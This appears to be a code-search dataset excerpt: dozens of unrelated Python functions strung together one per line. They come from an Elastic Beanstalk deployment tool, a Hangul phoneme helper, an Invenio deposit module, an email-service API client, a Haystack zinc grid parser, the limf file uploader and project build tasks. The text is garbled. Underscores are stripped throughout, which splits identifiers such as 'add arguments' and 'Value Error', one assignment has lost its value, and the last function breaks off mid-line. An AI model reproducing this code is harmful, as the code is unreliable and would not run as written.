def add arguments ( parser ) : parser . add argument ( '-e' , '--environment' , help = 'Environment name' , required = True ) parser . add argument ( '-w' , '--dont-wait' , help = 'Skip waiting for the init to finish' , action = 'store true' ) parser . add argument ( '-l' , '--version-label' , help = 'Version label' , required = False )
def execute ( helper , config , args ) : env config = parse env config ( config , args . environment ) cname prefix = env config . get ( 'cname prefix' , None ) env name = args . environment # change version if args . version label : helper . deploy version ( env name , args . version label ) if not args . dont wait : helper . wait for environments ( env name , status = 'Ready' , version label = args . version label ) # update it env = parse env config ( config , env name ) option settings = parse option settings ( env . get ( 'option settings' , { } ) ) helper . update environment ( env name , description = env . get ( 'description' , None ) , option settings = option settings , tier type = env . get ( 'tier type' ) , tier name = env . get ( 'tier name' ) , tier version = env . get ( 'tier version' ) ) # wait if not args . dont wait : helper . wait for environments ( env name , health = 'Green' , status = 'Ready' , version label = args . version label ) # delete unused helper . delete unused versions ( versions to keep = int ( get ( config , 'app.versions to keep' , 10 ) ) )
def join phonemes ( * args ) : # Normalize arguments as onset, nucleus, coda. if len ( args ) == 1 : # tuple of (onset, nucleus[, coda]) args = args [ 0 ] if len ( args ) == 2 : args += ( CODAS [ 0 ] , ) try : onset , nucleus , coda = args except Value Error : raise Type Error ( 'join phonemes() takes at most 3 arguments' ) offset = ( ( ONSETS . index ( onset ) * NUM NUCLEUSES + NUCLEUSES . index ( nucleus ) ) * NUM CODAS + CODAS . index ( coda ) ) return unichr ( FIRST HANGUL OFFSET + offset )
def execute ( helper , config , args ) : helper . wait for environments ( args . environment , health = args . health )
def add arguments ( parser ) : parser . add argument ( '-e' , '--environment' , help = 'Environment name' , required = False , nargs = '+' ) parser . add argument ( '-w' , '--dont-wait' , help = 'Skip waiting for the app to be deleted' , action = 'store true' )
def execute ( helper , config , args ) : environment name = args . environment ( events , next token ) = helper . describe events ( environment name , start time = datetime . now ( ) . isoformat ( ) ) # swap C-Names for event in events : print ( ( "[" + event [ 'Severity' ] + "] " + event [ 'Message' ] ) )
def add arguments ( parser ) : parser . add argument ( '-e' , '--environment' , help = 'Environment name' , required = True ) parser . add argument ( '-w' , '--dont-wait' , help = 'Skip waiting' , action = 'store true' ) parser . add argument ( '-a' , '--archive' , help = 'Archive file' , required = False ) parser . add argument ( '-d' , '--directory' , help = 'Directory' , required = False ) parser . add argument ( '-l' , '--version-label' , help = 'Version label' , required = False ) parser . add argument ( '-t' , '--termination-delay' , help = 'Delay termination of old environment by this number of seconds' , type = int , required = False )
def execute ( helper , config , args ) : version label = args . version label archive = args . archive # get the environment configuration env config = parse env config ( config , args . environment ) option settings = parse option settings ( env config . get ( 'option settings' , { } ) ) cname prefix = env config . get ( 'cname prefix' , None ) # no zdt for anything but web server tier name = env config . get ( 'tier name' , 'Web Server' ) if tier name != 'Web Server' : raise Exception ( "Only able to do zero downtime deployments for " "Web Server tiers, can't do them for %s" % ( tier name , ) ) # find an available environment name out ( "Determining new environment name..." ) new env name = None if not helper . environment exists ( args . environment ) : new env name = args . environment else : for i in range ( 10 ) : temp env name = args . environment + '-' + str ( i ) if not helper . environment exists ( temp env name ) : new env name = temp env name break if new env name is None : raise Exception ( "Unable to determine new environment name" ) out ( "New environment name will be " + new env name ) # find an available cname name out ( "Determining new environment cname..." ) new env cname = None for i in range ( 10 ) : temp cname = cname prefix + '-' + str ( i ) if not helper . environment name for cname ( temp cname ) : new env cname = temp cname break if new env cname is None : raise Exception ( "Unable to determine new environment cname" ) out ( "New environment cname will be " + new env cname ) # upload or build an archive version label = upload application archive ( helper , env config , archive = args . archive , directory = args . directory , version label = version label ) # create the new environment helper . create environment ( new env name , solution stack name = env config . get ( 'solution stack name' ) , cname prefix = new env cname , description = env config . get ( 'description' , None ) , option settings = option settings , version label = version label , tier name = tier name , tier type = env config . get ( 'tier type' ) , tier version = env config . get ( 'tier version' ) ) helper . wait for environments ( new env name , status = 'Ready' , health = 'Green' , include deleted = False ) # find existing environment name old env name = helper . environment name for cname ( cname prefix ) if old env name is None : raise Exception ( "Unable to find current environment with cname: " + cname prefix ) out ( "Current environment name is " + old env name ) # swap C-Names out ( "Swapping environment cnames" ) helper . swap environment cnames ( old env name , new env name ) helper . wait for environments ( [ old env name , new env name ] , status = 'Ready' , include deleted = False ) # delete the old environment if args . termination delay : out ( "Termination delay specified, sleeping for {} seconds..." . format ( args . termination delay ) ) time . sleep ( args . termination delay ) out ( "Deleting old environment {}" . format ( old env name ) ) helper . delete environment ( old env name ) # delete unused helper . delete unused versions ( versions to keep = int ( get ( config , 'app.versions to keep' , 10 ) ) )
def pick coda from decimal ( decimal ) : decimal = Decimal ( decimal ) , digits , exp = decimal . as tuple ( ) if exp < 0 : return DIGIT CODAS [ digits [ - 1 ] ] , digits , exp = decimal . normalize ( ) . as tuple ( ) index = bisect right ( EXP INDICES , exp ) - 1 if index < 0 : return DIGIT CODAS [ digits [ - 1 ] ] else : return EXP CODAS [ EXP INDICES [ index ] ]
def extract actions from class ( record class ) : for name in dir ( record class ) : method = getattr ( record class , name , None ) if method and getattr ( method , ' deposit action ' , False ) : yield method . name
def create error handlers ( blueprint ) : blueprint . errorhandler ( PID Invalid Action ) ( create api errorhandler ( status = 403 , message = 'Invalid action' ) ) records rest error handlers ( blueprint )
def location ( ) : d = current app . config [ 'DATADIR' ] with db . session . begin nested ( ) : Location . query . delete ( ) loc = Location ( name = 'local' , uri = d , default = True ) db . session . add ( loc ) db . session . commit ( )
def jsonschemas ( self ) : jsonschemas = { k : v [ 'jsonschema' ] for k , v in self . app . config [ 'DEPOSIT RECORDS UI ENDPOINTS' ] . items ( ) if 'jsonschema' in v } return defaultdict ( lambda : self . app . config [ 'DEPOSIT DEFAULT JSONSCHEMA' ] , jsonschemas )
def schemaforms ( self ) : schemaforms = { k : v [ 'schemaform' ] for k , v in self . app . config [ 'DEPOSIT RECORDS UI ENDPOINTS' ] . items ( ) if 'schemaform' in v } return defaultdict ( lambda : self . app . config [ 'DEPOSIT DEFAULT SCHEMAFORM' ] , schemaforms )
def pid ( self ) : pid = self . deposit fetcher ( self . id , self ) return Persistent Identifier . get ( pid . pid type , pid . pid value )
def record schema ( self ) : schema path = current jsonschemas . url to path ( self [ '$schema' ] ) schema prefix = current app . config [ 'DEPOSIT JSONSCHEMAS PREFIX' ] if schema path and schema path . startswith ( schema prefix ) : return current jsonschemas . path to url ( schema path [ len ( schema prefix ) : ] )
def fetch published ( self ) : pid type = self [ ' deposit' ] [ 'pid' ] [ 'type' ] pid value = self [ ' deposit' ] [ 'pid' ] [ 'value' ] resolver = Resolver ( pid type = pid type , object type = 'rec' , getter = partial ( self . published record class . get record , with deleted = True ) ) return resolver . resolve ( pid value )
def merge with published ( self ) : pid , first = self . fetch published ( ) lca = first . revisions [ self [ ' deposit' ] [ 'pid' ] [ 'revision id' ] ] # ignore  deposit and $schema field args = [ lca . dumps ( ) , first . dumps ( ) , self . dumps ( ) ] for arg in args : del arg [ '$schema' ] , arg [ ' deposit' ] args . append ( { } ) m = Merger ( * args ) try : m . run ( ) except Unresolved Conflicts Exception : raise Merge Conflict ( ) return patch ( m . unified patches , lca )
def commit ( self , * args , * * kwargs ) : return super ( Deposit , self ) . commit ( * args , * * kwargs )
def process files ( self , record id , data ) : if self . files : assert not self . files . bucket . locked self . files . bucket . locked = True snapshot = self . files . bucket . snapshot ( lock = True ) data [ ' files' ] = self . files . dumps ( bucket = snapshot . id ) yield data db . session . add ( Records Buckets ( record id = record id , bucket id = snapshot . id ) ) else : yield data
def publish edited ( self ) : record pid , record = self . fetch published ( ) if record . revision id == self [ ' deposit' ] [ 'pid' ] [ 'revision id' ] : data = dict ( self . dumps ( ) ) else : data = self . merge with published ( ) data [ '$schema' ] = self . record schema data [ ' deposit' ] = self [ ' deposit' ] record = record . class ( data , model = record . model ) return record
def rst2node ( doc name , data ) : if not data : return parser = docutils . parsers . rst . Parser ( ) document = docutils . utils . new document ( '<%s>' % doc name ) document . settings = docutils . frontend . Option Parser ( ) . get default values ( ) document . settings . tab width = 4 document . settings . pep references = False document . settings . rfc references = False document . settings . env = Env ( ) parser . parse ( data , document ) if len ( document . children ) == 1 : return document . children [ 0 ] else : par = docutils . nodes . paragraph ( ) for child in document . children : par += child return par
def setup ( app ) : if 'http' not in app . domains : httpdomain . setup ( app ) app . add directive ( 'autopyramid' , Route Directive )
def api request ( self , endpoint , http method , * args , * * kwargs ) : logger . debug ( ' > Sending API request to endpoint: %s' % endpoint ) auth = self . build http auth ( ) headers = self . build request headers ( kwargs . get ( 'headers' ) ) logger . debug ( '\theaders: %s' % headers ) path = self . build request path ( endpoint ) logger . debug ( '\tpath: %s' % path ) data = self . build payload ( kwargs . get ( 'payload' ) ) if not data : data = kwargs . get ( 'data' ) logger . debug ( '\tdata: %s' % data ) req kw = dict ( auth = auth , headers = headers , timeout = kwargs . get ( 'timeout' , self . DEFAULT TIMEOUT ) ) # do some error handling if ( http method == self . HTTP POST ) : if ( data ) : r = requests . post ( path , data = data , * * req kw ) else : r = requests . post ( path , * * req kw ) elif http method == self . HTTP PUT : if ( data ) : r = requests . put ( path , data = data , * * req kw ) else : r = requests . put ( path , * * req kw ) elif http method == self . HTTP DELETE : r = requests . delete ( path , * * req kw ) else : r = requests . get ( path , * * req kw ) logger . debug ( '\tresponse code:%s' % r . status code ) try : logger . debug ( '\tresponse: %s' % r . json ( ) ) except : logger . debug ( '\tresponse: %s' % r . content ) return self . parse response ( r )
def get log ( self , log id , timeout = None ) : return self . api request ( self . GET LOG ENDPOINT % log id , self . HTTP GET , timeout = timeout )
def get log events ( self , log id , timeout = None ) : return self . api request ( self . GET LOG EVENTS ENDPOINT % log id , self . HTTP GET , timeout = timeout )
def templates ( self , timeout = None ) : return self . api request ( self . TEMPLATES ENDPOINT , self . HTTP GET , timeout = timeout )
def get template ( self , template id , version = None , timeout = None ) : if ( version ) : return self . api request ( self . TEMPLATES VERSION ENDPOINT % ( template id , version ) , self . HTTP GET , timeout = timeout ) else : return self . api request ( self . TEMPLATES SPECIFIC ENDPOINT % template id , self . HTTP GET , timeout = timeout )
def create template ( self , name , subject , html , text = '' , timeout = None ) : payload = { 'name' : name , 'subject' : subject , 'html' : html , 'text' : text } return self . api request ( self . TEMPLATES ENDPOINT , self . HTTP POST , payload = payload , timeout = timeout )
def create new locale ( self , template id , locale , version name , subject , text = '' , html = '' , timeout = None ) : payload = { 'locale' : locale , 'name' : version name , 'subject' : subject } if html : payload [ 'html' ] = html if text : payload [ 'text' ] = text return self . api request ( self . TEMPLATES LOCALES ENDPOINT % template id , self . HTTP POST , payload = payload , timeout = timeout )
def create new version ( self , name , subject , text = '' , template id = None , html = None , locale = None , timeout = None ) : if ( html ) : payload = { 'name' : name , 'subject' : subject , 'html' : html , 'text' : text } else : payload = { 'name' : name , 'subject' : subject , 'text' : text } if locale : url = self . TEMPLATES SPECIFIC LOCALE VERSIONS ENDPOINT % ( template id , locale ) else : url = self . TEMPLATES NEW VERSION ENDPOINT % template id return self . api request ( url , self . HTTP POST , payload = payload , timeout = timeout )
def update template version ( self , name , subject , template id , version id , text = '' , html = None , timeout = None ) : if ( html ) : payload = { 'name' : name , 'subject' : subject , 'html' : html , 'text' : text } else : payload = { 'name' : name , 'subject' : subject , 'text' : text } return self . api request ( self . TEMPLATES VERSION ENDPOINT % ( template id , version id ) , self . HTTP PUT , payload = payload , timeout = timeout )
def snippets ( self , timeout = None ) : return self . api request ( self . SNIPPETS ENDPOINT , self . HTTP GET , timeout = timeout )
def get snippet ( self , snippet id , timeout = None ) : return self . api request ( self . SNIPPET ENDPOINT % ( snippet id ) , self . HTTP GET , timeout = timeout )
def create snippet ( self , name , body , timeout = None ) : payload = { 'name' : name , 'body' : body } return self . api request ( self . SNIPPETS ENDPOINT , self . HTTP POST , payload = payload , timeout = timeout )
def make file dict ( self , f ) : if isinstance ( f , dict ) : file obj = f [ 'file' ] if 'filename' in f : file name = f [ 'filename' ] else : file name = file obj . name else : file obj = f file name = f . name b64 data = base64 . b64encode ( file obj . read ( ) ) return { 'id' : file name , 'data' : b64 data . decode ( ) if six . PY3 else b64 data , }
def send ( self , email id , recipient , email data = None , sender = None , cc = None , bcc = None , tags = [ ] , headers = { } , esp account = None , locale = None , email version name = None , inline = None , files = [ ] , timeout = None ) : if not email data : email data = { } # for backwards compatibility, will be removed if isinstance ( recipient , string types ) : warnings . warn ( "Passing email directly for recipient is deprecated" , Deprecation Warning ) recipient = { 'address' : recipient } payload = { 'email id' : email id , 'recipient' : recipient , 'email data' : email data } if sender : payload [ 'sender' ] = sender if cc : if not type ( cc ) == list : logger . error ( 'kwarg cc must be type(list), got %s' % type ( cc ) ) payload [ 'cc' ] = cc if bcc : if not type ( bcc ) == list : logger . error ( 'kwarg bcc must be type(list), got %s' % type ( bcc ) ) payload [ 'bcc' ] = bcc if tags : if not type ( tags ) == list : logger . error ( 'kwarg tags must be type(list), got %s' % ( type ( tags ) ) ) payload [ 'tags' ] = tags if headers : if not type ( headers ) == dict : logger . error ( 'kwarg headers must be type(dict), got %s' % ( type ( headers ) ) ) payload [ 'headers' ] = headers if esp account : if not isinstance ( esp account , string types ) : logger . error ( 'kwarg esp account must be a string, got %s' % ( type ( esp account ) ) ) payload [ 'esp account' ] = esp account if locale : if not isinstance ( locale , string types ) : logger . error ( 'kwarg locale must be a string, got %s' % ( type ( locale ) ) ) payload [ 'locale' ] = locale if email version name : if not isinstance ( email version name , string types ) : logger . error ( 'kwarg email version name must be a string, got %s' % ( type ( email version name ) ) ) payload [ 'version name' ] = email version name if inline : payload [ 'inline' ] = self . make file dict ( inline ) if files : payload [ 'files' ] = [ self . make file dict ( f ) for f in files ] return self . api request ( self . SEND ENDPOINT , self . HTTP POST , payload = payload , timeout = timeout )
def api request ( self , endpoint , http method , * args , * * kwargs ) : logger . debug ( ' > Queing batch api request for endpoint: %s' % endpoint ) path = self . build request path ( endpoint , absolute = False ) logger . debug ( '\tpath: %s' % path ) data = None if 'payload' in kwargs : data = kwargs [ 'payload' ] logger . debug ( '\tdata: %s' % data ) command = { "path" : path , "method" : http method } if data : command [ 'body' ] = data self . commands . append ( command )
def execute ( self , timeout = None ) : logger . debug ( ' > Batch API request (length %s)' % len ( self . commands ) ) auth = self . build http auth ( ) headers = self . build request headers ( ) logger . debug ( '\tbatch headers: %s' % headers ) logger . debug ( '\tbatch command length: %s' % len ( self . commands ) ) path = self . build request path ( self . BATCH ENDPOINT ) data = json . dumps ( self . commands , cls = self . json encoder ) r = requests . post ( path , auth = auth , headers = headers , data = data , timeout = ( self . DEFAULT TIMEOUT if timeout is None else timeout ) ) self . commands = [ ] logger . debug ( '\tresponse code:%s' % r . status code ) try : logger . debug ( '\tresponse: %s' % r . json ( ) ) except : logger . debug ( '\tresponse: %s' % r . content ) return r
def dump grid ( grid ) : header = 'ver:%s' % dump str ( str ( grid . version ) , version = grid . version ) if bool ( grid . metadata ) : header += ' ' + dump meta ( grid . metadata , version = grid . version ) columns = dump columns ( grid . column , version = grid . version ) rows = dump rows ( grid ) return '\n' . join ( [ header , columns ] + rows + [ '' ] )
def parse ( grid str , mode = MODE ZINC , charset = 'utf-8' ) : # Decode incoming text (or python3 will whine!) if isinstance ( grid str , six . binary type ) : grid str = grid str . decode ( encoding = charset ) # Split the separate grids up, the grammar definition has trouble splitting # them up normally.  This will truncate the newline off the end of the last # row. parse = functools . partial ( parse grid , mode = mode , charset = charset ) if mode == MODE JSON : if isinstance ( grid str , six . string types ) : grid data = json . loads ( grid str ) else : grid data = grid str if isinstance ( grid data , dict ) : return parse ( grid data ) else : return list ( map ( parse , grid data ) ) else : return list ( map ( parse , GRID SEP . split ( grid str . rstrip ( ) ) ) )
def append ( self , key , value = MARKER , replace = True ) : return self . add item ( key , value , replace = replace )
def extend ( self , items , replace = True ) : if isinstance ( items , dict ) or isinstance ( items , Sortable Dict ) : items = list ( items . items ( ) ) for ( key , value ) in items : self . append ( key , value , replace = replace )
def kwargs ( self ) : return dict ( color = self . color , velocity = self . velocity , colors = self . colors )
def draw ( self ) : if self . enabled : self . vertex list . colors = self . gl colors self . vertex list . vertices = self . gl vertices self . vertex list . draw ( pyglet . gl . GL TRIANGLES )
def map timezones ( ) : tz map = { } todo = HAYSTACK TIMEZONES SET . copy ( ) for full tz in pytz . all timezones : # Finished case: if not bool ( todo ) : # pragma: no cover # This is nearly impossible for us to cover, and an unlikely case. break # Case 1: exact match if full tz in todo : tz map [ full tz ] = full tz # Exact match todo . discard ( full tz ) continue # Case 2: suffix match after '/' if '/' not in full tz : continue ( prefix , suffix ) = full tz . split ( '/' , 1 ) # Case 2 exception: full timezone contains more than one '/' -> ignore if '/' in suffix : continue if suffix in todo : tz map [ suffix ] = full tz todo . discard ( suffix ) continue return tz map
def timezone ( haystack tz , version = LATEST VER ) : tz map = get tz map ( version = version ) try : tz name = tz map [ haystack tz ] except Key Error : raise Value Error ( '%s is not a recognised timezone on this host' % haystack tz ) return pytz . timezone ( tz name )
def unescape ( s , uri = False ) : out = '' while len ( s ) > 0 : c = s [ 0 ] if c == '\\' : # Backslash escape esc c = s [ 1 ] if esc c in ( 'u' , 'U' ) : # Unicode escape out += six . unichr ( int ( s [ 2 : 6 ] , base = 16 ) ) s = s [ 6 : ] continue else : if esc c == 'b' : out += '\b' elif esc c == 'f' : out += '\f' elif esc c == 'n' : out += '\n' elif esc c == 'r' : out += '\r' elif esc c == 't' : out += '\t' else : if uri and ( esc c == '#' ) : # \# is passed through with backslash. out += '\\' # Pass through out += esc c s = s [ 2 : ] continue else : out += c s = s [ 1 : ] return out
def parse grid ( grid data ) : try : # Split the grid up. grid parts = NEWLINE RE . split ( grid data ) if len ( grid parts ) < 2 : raise Zinc Parse Exception ( 'Malformed grid received' , grid data , 1 , 1 ) # Grid and column metadata are the first two lines. grid meta str = grid parts . pop ( 0 ) col meta str = grid parts . pop ( 0 ) # First element is the grid metadata ver match = VERSION RE . match ( grid meta str ) if ver match is None : raise Zinc Parse Exception ( 'Could not determine version from %r' % grid meta str , grid data , 1 , 1 ) version = Version ( ver match . group ( 1 ) ) # Now parse the rest of the grid accordingly try : grid meta = hs grid Meta [ version ] . parse String ( grid meta str , parse All = True ) [ 0 ] except pp . Parse Exception as pe : # Raise a new exception with the appropriate line number. raise Zinc Parse Exception ( 'Failed to parse grid metadata: %s' % pe , grid data , 1 , pe . col ) except : # pragma: no cover # Report an error to the log if we fail to parse something. LOG . debug ( 'Failed to parse grid meta: %r' , grid meta str ) raise try : col meta = hs cols [ version ] . parse String ( col meta str , parse All = True ) [ 0 ] except pp . Parse Exception as pe : # Raise a new exception with the appropriate line number. raise Zinc Parse Exception ( 'Failed to parse column metadata: %s' % reformat exception ( pe , 2 ) , grid data , 2 , pe . col ) except : # pragma: no cover # Report an error to the log if we fail to parse something. LOG . debug ( 'Failed to parse column meta: %r' , col meta str ) raise row grammar = hs row [ version ] def parse row ( row num and data ) : ( row num , row ) = row num and data line num = row num + 3 try : return dict ( zip ( col meta . keys ( ) , row grammar . parse String ( row , parse All = True ) [ 0 ] . as List ( ) ) ) except pp . Parse Exception as pe : # Raise a new exception with the appropriate line number. raise Zinc Parse Exception ( 'Failed to parse row: %s' % reformat exception ( pe , line num ) , grid data , line num , pe . col ) except : # pragma: no cover # Report an error to the log if we fail to parse something. LOG . debug ( 'Failed to parse row: %r' , row ) raise g = Grid ( version = grid meta . pop ( 'ver' ) , metadata = grid meta , columns = list ( col meta . items ( ) ) ) g . extend ( map ( parse row , filter ( lambda gp : bool ( gp [ 1 ] ) , enumerate ( grid parts ) ) ) ) return g except : LOG . debug ( 'Failing grid: %r' , grid data ) raise
def parse scalar ( scalar data , version ) : try : return hs scalar [ version ] . parse String ( scalar data , parse All = True ) [ 0 ] except pp . Parse Exception as pe : # Raise a new exception with the appropriate line number. raise Zinc Parse Exception ( 'Failed to parse scalar: %s' % reformat exception ( pe ) , scalar data , 1 , pe . col ) except : LOG . debug ( 'Failing scalar data: %r (version %r)' , scalar data , version )
def dump ( grids , mode = MODE ZINC ) : if isinstance ( grids , Grid ) : return dump grid ( grids , mode = mode ) dump = functools . partial ( dump grid , mode = mode ) if mode == MODE ZINC : return '\n' . join ( map ( dump , grids ) ) elif mode == MODE JSON : return '[%s]' % ',' . join ( map ( dump , grids ) ) else : # pragma: no cover raise Not Implemented Error ( 'Format not implemented: %s' % mode )
def nearest ( self , ver ) : if not isinstance ( ver , Version ) : ver = Version ( ver ) if ver in OFFICIAL VERSIONS : return ver # We might not have an exact match for that. # See if we have one that's newer than the grid we're looking at. versions = list ( OFFICIAL VERSIONS ) versions . sort ( reverse = True ) best = None for candidate in versions : # Due to ambiguities, we might have an exact match and not know it. # '2.0' will not hash to the same value as '2.0.0', but both are # equivalent. if candidate == ver : # We can't beat this, make a note of the match for later return candidate # If we have not seen a better candidate, and this is older # then we may have to settle for that. if ( best is None ) and ( candidate < ver ) : warnings . warn ( 'This version of hszinc does not yet ' 'support version %s, please seek a newer version ' 'or file a bug.  Closest (older) version supported is %s.' % ( ver , candidate ) ) return candidate # Probably the best so far, but see if we can go closer if candidate > ver : best = candidate # Unhappy path, no best option?  This should not happen. assert best is not None warnings . warn ( 'This version of hszinc does not yet ' 'support version %s, please seek a newer version ' 'or file a bug.  Closest (newer) version supported is %s.' % ( ver , best ) ) return best
def encrypt files ( selected host , only link , file name ) : if ENCRYPTION DISABLED : print ( 'For encryption please install gpg' ) exit ( ) passphrase = '%030x' % random . randrange ( 16 ** 30 ) source filename = file name cmd = 'gpg --batch --symmetric --cipher-algo AES256 --passphrase-fd 0 ' '--output - {}' . format ( source filename ) encrypted output = Popen ( shlex . split ( cmd ) , stdout = PIPE , stdin = PIPE , stderr = PIPE ) encrypted data = encrypted output . communicate ( passphrase . encode ( ) ) [ 0 ] return upload files ( encrypted data , selected host , only link , file name ) + '#' + passphrase
def check max filesize ( chosen file , max size ) : if os . path . getsize ( chosen file ) > max size : return False else : return True
def parse arguments ( args , clone list ) : returned string = "" host number = args . host if args . show list : print ( generate host string ( clone list , "Available hosts: " ) ) exit ( ) if args . decrypt : for i in args . files : print ( decrypt files ( i ) ) exit ( ) if args . files : for i in args . files : if args . limit size : if args . host == host number and host number is not None : if not check max filesize ( i , clone list [ host number ] [ 3 ] ) : host number = None for n , host in enumerate ( clone list ) : if not check max filesize ( i , host [ 3 ] ) : clone list [ n ] = None if not clone list : print ( 'None of the clones is able to support so big file.' ) if args . no cloudflare : if args . host == host number and host number is not None and not clone list [ host number ] [ 4 ] : print ( "This host uses Cloudflare, please choose different host." ) exit ( 1 ) else : for n , host in enumerate ( clone list ) : if not host [ 4 ] : clone list [ n ] = None clone list = list ( filter ( None , clone list ) ) if host number is None or args . host != host number : host number = random . randrange ( 0 , len ( clone list ) ) while True : try : if args . encrypt : returned string = encrypt files ( clone list [ host number ] , args . only link , i ) else : returned string = upload files ( open ( i , 'rb' ) , clone list [ host number ] , args . only link , i ) if args . only link : print ( returned string [ 0 ] ) else : print ( returned string ) except Index Error : #print('Selected server (' + clone list[host number][0] + ') is offline.') #print('Trying other host.') host number = random . randrange ( 0 , len ( clone list ) ) continue except Is A Directory Error : print ( 'limf does not support directory upload, if you want to upload ' 'every file in directory use limf {}/*.' . format ( i . replace ( '/' , '' ) ) ) if args . log : with open ( os . path . expanduser ( args . logfile ) , "a+" ) as logfile : if args . only link : logfile . write ( returned string [ 1 ] ) else : logfile . write ( returned string ) logfile . write ( "\n" ) break else : print ( "limf: try 'limf -h' for more information" )
def decrypt files ( file link ) : if ENCRYPTION DISABLED : print ( 'For decryption please install gpg' ) exit ( ) try : parsed link = re . findall ( r'(.*/(.*))#(.{30})' , file link ) [ 0 ] req = urllib . request . Request ( parsed link [ 0 ] , data = None , headers = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10 9 3) ' ' Apple Web Kit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36' } ) #downloads the file using fake useragent file response = urllib . request . urlopen ( req ) file to decrypt = file response . read ( ) #decrypts the data using piping to ggp decrypt r , decrypt w = os . pipe ( ) cmd = 'gpg --batch --decrypt --passphrase-fd {}' . format ( decrypt r ) decrypt output = Popen ( shlex . split ( cmd ) , stdout = PIPE , stdin = PIPE , stderr = PIPE , pass fds = ( decrypt r , ) ) os . close ( decrypt r ) open ( decrypt w , 'w' ) . write ( parsed link [ 2 ] ) decrypted data , stderr = decrypt output . communicate ( file to decrypt ) with open ( parsed link [ 1 ] , 'wb' ) as decrypted file : decrypted file . write ( decrypted data ) return parsed link [ 1 ] + ' is decrypted and saved.' except Index Error : return 'Please enter valid link.'
def set value ( request ) : key = request . matchdict [ 'key' ] VALUES [ key ] = request . json body return VALUES . get ( key )
def main ( ) : parser = argparse . Argument Parser ( description = ( 'Uploads selected file to working pomf.se clone' ) ) parser . add argument ( 'files' , metavar = 'file' , nargs = '*' , type = str , help = ( 'Files to upload' ) ) parser . add argument ( '-c' , metavar = 'host number' , type = int , dest = 'host' , default = None , help = ( 'The number (0-n) of the selected host (default is random)' ) ) parser . add argument ( '-l' , dest = 'only link' , action = 'store const' , const = True , default = False , help = ( 'Changes output to just link to the file' ) ) parser . add argument ( '-e' , dest = 'encrypt' , action = 'store const' , const = True , default = False , help = ( 'Encrypts then uploads the files.' ) ) parser . add argument ( '-d' , dest = 'decrypt' , action = 'store const' , const = True , default = False , help = ( 'Decrypts files from links with encrypted files' ) ) parser . add argument ( '-j' , dest = "local list" , default = False , help = ( 'Path to a local list file' ) ) parser . add argument ( '-s' , dest = "show list" , action = 'store const' , const = True , default = False , help = ( 'Show the host list (will not upload your files when called)' ) ) parser . add argument ( '-m' , dest = 'limit size' , action = 'store const' , const = True , default = False , help = ( 'Do not upload file if it exceeds the certain host limit' ) ) parser . add argument ( '-nc' , dest = 'no cloudflare' , action = 'store const' , const = True , default = False , help = ( 'Do not use hosts which use Cloudflare.' ) ) parser . add argument ( '--log-file' , metavar = "LOGFILE" , dest = "logfile" , default = "~/limf.log" , help = ( "The location of log file" ) ) parser . add argument ( '--log' , dest = 'log' , action = "store const" , const = True , default = False , help = ( "Enables the logging feature, default logfile is ~/limf.log" ) ) args = parser . parse args ( ) try : if args . local list : clone list = retrieve local host list ( args . local list ) else : clone list = retrieve online host list ( ) if len ( min ( clone list , key = len ) ) < 5 and ( args . limit size or args . no cloudflare ) : print ( ( "For newer options, please update your host list." ) ) exit ( ) if args . host and not ( 0 <= args . host < len ( clone list ) ) : print ( generate host string ( clone list ) ) exit ( ) parse arguments ( args , clone list ) except File Not Found Error : print ( ( 'Plese enter valid file.' ) )
def convert ( self , schema node , definition handler ) : converted = { 'name' : schema node . name , 'in' : self . in , 'required' : schema node . required } if schema node . description : converted [ 'description' ] = schema node . description if schema node . default : converted [ 'default' ] = schema node . default schema = definition handler ( schema node ) # Parameters shouldn't have a title schema . pop ( 'title' , None ) converted . update ( schema ) if schema . get ( 'type' ) == 'array' : converted [ 'items' ] = { 'type' : schema [ 'items' ] [ 'type' ] } return converted
def get transition viewset method ( transition name , * * kwargs ) : @ detail route ( methods = [ 'post' ] , * * kwargs ) def inner func ( self , request , pk = None , * * kwargs ) : object = self . get object ( ) transition method = getattr ( object , transition name ) transition method ( by = self . request . user ) if self . save after transition : object . save ( ) serializer = self . get serializer ( object ) return Response ( serializer . data ) return inner func
def fresh cookies ( ctx , mold = '' ) : mold = mold or # TODO: URL from config tmpdir = os . path . join ( tempfile . gettempdir ( ) , "cc-upgrade-pygments-markdown-lexer" ) if os . path . isdir ( '.git' ) : # TODO: Ensure there are no local unstashed changes pass # Make a copy of the new mold version if os . path . isdir ( tmpdir ) : shutil . rmtree ( tmpdir ) if os . path . exists ( mold ) : shutil . copytree ( mold , tmpdir , ignore = shutil . ignore patterns ( ".git" , ".svn" , "*~" , ) ) else : ctx . run ( "git clone {} {}" . format ( mold , tmpdir ) ) # Copy recorded "cookiecutter.json" into mold shutil . copy2 ( "project.d/cookiecutter.json" , tmpdir ) with pushd ( '..' ) : ctx . run ( "cookiecutter --no-input {}" . format ( tmpdir ) ) if os . path . exists ( '.git' ) : ctx . run ( "git status" )
def ci ( ctx ) : opts = [ '' ] # 'tox' makes no sense in Travis if os . environ . get ( 'TRAVIS' , '' ) . lower ( ) == 'true' : opts += [ 'test.pytest' ] else : opts += [ 'test.tox' ] ctx . run ( "invoke --echo --pty clean --all build --docs check --reports{}" . format ( ' ' . join ( opts ) ) )
def build metadata ( ) : # pylint: disable=too-many-locals, too-many-branches # Handle metadata in package source expected keys = ( 'url' , 'version' , 'license' , 'author' , 'author email' , 'long description' , 'keywords' ) metadata = { } with io . open ( srcfile ( 'src' , package name , ' init .py' ) , encoding = 'utf-8' ) as handle : pkg init = handle . read ( ) # Get default long description from docstring metadata [ 'long description' ] = re . search ( r'^"""(.+?)^"""$' , pkg init , re . DOTALL | re . MULTILINE ) . group ( 1 ) for line in pkg init . splitlines ( ) : match = re . match ( r"""^ ({0})  += (?P<q>['"])(.+?)(?P=q)$""" . format ( '|' . join ( expected keys ) ) , line ) if match : metadata [ match . group ( 1 ) ] = match . group ( 3 ) if not all ( i in metadata for i in expected keys ) : raise Runtime Error ( "Missing or bad metadata in '{0}' package: {1}" . format ( name , ', ' . join ( sorted ( set ( expected keys ) - set ( metadata . keys ( ) ) ) ) , ) ) text = metadata [ 'long description' ] . strip ( ) if text : metadata [ 'description' ] , text = text . split ( '.' , 1 ) metadata [ 'description' ] = ' ' . join ( metadata [ 'description' ] . split ( ) ) . strip ( ) + '.' # normalize whitespace metadata [ 'long description' ] = textwrap . dedent ( text ) . strip ( ) metadata [ 'keywords' ] = metadata [ 'keywords' ] . replace ( ',' , ' ' ) . strip ( ) . split ( ) # Load requirements files requirements files = dict ( install = 